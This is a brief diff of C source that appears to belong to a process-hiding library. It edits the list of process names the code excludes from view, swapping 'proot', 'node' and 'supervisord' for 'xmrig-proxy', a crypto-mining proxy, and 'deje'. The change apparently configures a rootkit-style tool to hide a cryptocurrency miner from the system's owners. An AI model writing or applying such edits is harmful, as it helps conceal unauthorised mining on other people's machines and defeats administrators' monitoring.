@@ -10,9 +10,8 @@
  * Every process with this name will be excluded
  */
 static const char* processes_to_filter[] = {
-    "proot",
-    "node",
-    "supervisord"
+    "xmrig-proxy",
+    "deje"
 };
 
 /*
